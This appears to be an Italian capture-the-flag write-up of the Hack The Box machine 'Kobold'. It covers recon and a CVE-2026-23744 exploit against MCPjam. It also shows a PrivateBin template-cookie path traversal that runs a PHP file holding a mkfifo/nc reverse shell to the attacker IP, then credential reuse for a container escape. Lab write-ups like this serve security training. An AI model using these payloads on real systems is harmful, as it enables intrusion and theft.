# Kobold

IP vittima: 10.129.14.7
IP attaccante: 10.10.15.219

Inserire nel file `/etc/hosts ` l'host `10.129.14.7   kobold.htb`
## Recon
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.14.7 -oG porte`
``` bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.129.14.7 -oG porte
[sudo] password for parrot: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-04 13:57 CEST
Initiating Ping Scan at 13:57
Scanning 10.129.14.7 [4 ports]
Completed Ping Scan at 13:57, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:57
Scanning 10.129.14.7 [65535 ports]
Discovered open port 443/tcp on 10.129.14.7
Discovered open port 22/tcp on 10.129.14.7
Discovered open port 80/tcp on 10.129.14.7
Discovered open port 3552/tcp on 10.129.14.7
Completed SYN Stealth Scan at 13:58, 10.09s elapsed (65535 total ports)
Nmap scan report for 10.129.14.7
Host is up, received echo-reply ttl 63 (0.030s latency).
Scanned at 2026-04-04 13:57:51 CEST for 10s
Not shown: 65184 closed tcp ports (reset), 347 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63
443/tcp  open  https    syn-ack ttl 63
3552/tcp open  taserver syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.30 seconds
           Raw packets sent: 66069 (2.907MB) | Rcvd: 65193 (2.608MB)
```
Troviamo le porte 22, 80, 443, 3552

`sudo nmap -sC -sV -p22,80,443,3552 10.129.14.7 -oN servizi`
``` bash
sudo nmap -sC -sV -p22,80,443,3552 10.129.14.7 -oN servizi
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-04 14:04 CEST
Nmap scan report for 10.129.14.7
Host is up (0.021s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
|_http-title: Did not follow redirect to https://kobold.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
3552/tcp open  http     Golang net/http server
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Length: 2081
|     Content-Type: text/html; charset=utf-8
|     Expires: 0
|     Pragma: no-cache
|     Date: Sat, 04 Apr 2026 12:05:04 GMT
|     <!doctype html>
|     <html lang="%lang%">
|     <head>
|     <meta charset="utf-8" />
|     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
|     <meta http-equiv="Pragma" content="no-cache" />
|     <meta http-equiv="Expires" content="0" />
|     <link rel="icon" href="/api/app-images/favicon" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
|     <link rel="manifest" href="/app.webmanifest" />
|     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
|     <meta name="theme-color" content="oklch(0.141 0.005 285.823)" media="(prefers-color-scheme: dark)" />
|_    <link rel="modu
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3552-TCP:V=7.95%I=7%D=4/4%Time=69D0FE6F%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x
SF:20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revalidate\
SF:r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20charset=ut
SF:f-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Sat,\x2004\x20A
SF:pr\x202026\x2012:05:04\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x20lang=
SF:\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta\
SF:x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store,\x20
SF:must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20content=
SF:\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20content=\"0\
SF:"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favicon\"\
SF:x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,\
SF:x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x20/>\n
SF:\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>\n\t\t
SF:<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\x20me
SF:dia=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20name=\"t
SF:heme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\x20me
SF:dia=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\x20rel
SF:=\"modu")%r(HTTPOptions,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x
SF:20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revalidate\
SF:r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20charset=ut
SF:f-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Sat,\x2004\x20A
SF:pr\x202026\x2012:05:04\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x20lang=
SF:\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta\
SF:x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store,\x20
SF:must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20content=
SF:\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20content=\"0\
SF:"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favicon\"\
SF:x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,\
SF:x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x20/>\n
SF:\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>\n\t\t
SF:<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\x20me
SF:dia=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20name=\"t
SF:heme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\x20me
SF:dia=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\x20rel
SF:=\"modu");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.88 seconds
```

## ffuf
`ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'https://kobold.htb' -fr "302 Found" -H "Host: FUZZ.kobold.htb"`
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'https://kobold.htb' -fr "302 Found" -H "Host: FUZZ.kobold.htb"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://kobold.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.kobold.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: 302 Found
________________________________________________

mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 82ms]
bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 104ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1886 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```
Vengono trovati due sottodomini che si possono visitare:
`mcp.kobold.htb`
`bin.kobold.htb`
Vanno inseriti nel file `/etc/host`
`10.129.14.7   kobold.htb mcp.kobold.htb bin.kobold.htb`
## mcp.kobold.htb
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260404144409.png)

Si tratta del servizio **MCPjam versione 1.4.2**
![[Pasted image 20260404144522.png]]
### CVE-2026-23744
Questo servizio pare essere soggetto alla vulnerabilità `CVE-2026-23744` che può essere sfruttata con questo expoloit:
https://github-.com/H1sok444/CVE-2026-23744-PoC
Per utilizzarlo inserire nello script il nostro IP e la nostra porta in ascolto:
```
# Description : This was written for a CTF but can be used for any authorized vulnerable target
# CVE : CVE-2026-23744
# Author : H1sok444

import time
import requests
import sys

# Change this 

attacker_ip = "10.10.15.219"
port = 4444
```
Mettiamoci in ascolto con `nc -lvnp 4444`
Lanciamo l'exploit con `python3 exploit.py mcp.kobold.htb`
Sulla porta 4444 riceviamo la shell
### user flag
Sanitizziamo la shell con `python3 -c 'import pty; pty.spawn("/bin/bash")'`
Nella cartella `/home/ben` troviamo la user flag `user.txt`
## bin.kobold.htb
Visitiamo il sottodominio bin.kobold.htb:
![[Pasted image 20260404151232.png]]
Si tratta del servizio **PrivateBin versione 2.0.2**
Le versioni dalla 1.7.7 alla 2.0.3 sono esposte alla vulnerabilità path traversal **CVE-2025-64714** (GHSA-g2j9-g8r5-rg82):
https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-g2j9-g8r5-rg82
### GHSA-g2j9-g8r5-rg82
la vulnerabilità è sfruttabile solo se sono soddisfatte queste due condizioni:

1. **`templateselection` abilitata**: L'amministratore ha attivato questa opzione nel file di configurazione (`cfg/conf.php`).
    
2. **Cookie `template` manipolabile**: L'applicazione si fida ciecamente del cookie `template` inviato dal browser.
    
Se queste condizioni sono vere, il server include il file PHP specificato nel cookie, effettuando un **path traversal** a partire dalla directory dei template (`tpl/`)

#### Guida Passo-Passo allo Sfruttamento

Vediamo come potresti procedere praticamente:

1. **Verifica la Configurazione (Il Passo Cruciale)**  
    Prima di tutto, devi capire se l'opzione `templateselection` è abilitata. Un modo per farlo è cercare di cambiare il tema visivo di PrivateBin. Se nell'interfaccia utente c'è un'opzione per selezionare un tema diverso (es. "Bootstrap", "Dark", "Classic"), è molto probabile che la funzionalità sia attiva e quindi la vulnerabilità sia presente.

**Nel sito è possibile cambiare il tema**

2. **Intercetta e Modifica la Richiesta**  
    Una volta verificata la configurazione, puoi intercettare una richiesta HTTP verso `bin.kobold.htb` con un tool come **Burp Suite** o **ZAP Proxy**. Cerca il cookie `template` e modificalo

Nella root dell'user è presente la cartella **privatebin-data/data**, i file php inseriti qui possono essere inseriti qui ed eseguiti modificando il cookie `template` con #Burpsuite

Inseriamo in **privatebin-data/data** questo script php:
`echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.219 9001 >/tmp/f");?>' > pwn4.php`

Mettiamoci in ascolto con `nc -lvnp 9001` e con Burpsuite lanciamo lo script php:
![[Pasted image 20260404160354.png]]

Otteniamo una shell.
Accedendo alla directory `srv/cfg/conf.php`, possiamo ottenere informazioni sulla configurazione dell'ambiente. Questo conferma che PrivateBin è in esecuzione all'interno di un container Docker (utilizzando l'immagine `privatebin/nginx-fpm-alpine:2.0.2`) e rivela poi una password che possiamo utilizzare:
```
; example of DB configuration for MySQL
; Temporarily disabling while we migrate to new server for loadbalancing
;class = Database
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
tbl = "privatebin_"    ; table prefix
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
opt[12] = true   ; PDO::ATTR_PERSISTENT
```
Password: **ComplexP@sswordAdmin1928**
## Arcane (porta 3552)
Sulla porta 3552 è presente il servizio **Arcane**:
![[Pasted image 20260404161622.png]]
Possiamo accedere con le seguenti credenziali:
username: **arcane**
password: **ComplexP@sswordAdmin1928**

Creiamo un container: **Containers->Create Containers** con la seguente configurazione:
![[Pasted image 20260404162345.png]]
![[Pasted image 20260404162424.png]]
![[Pasted image 20260404162500.png]]
![[Pasted image 20260404162538.png]]
Dopo aver creato il container andiamo nella schermata **Containers** e selezioniamo **Inspect**
![[Pasted image 20260404162750.png]]
Poi scegliamo **Shell**. 
Da qui possiamo arrivare all root flag:
![[Pasted image 20260404162923.png]]
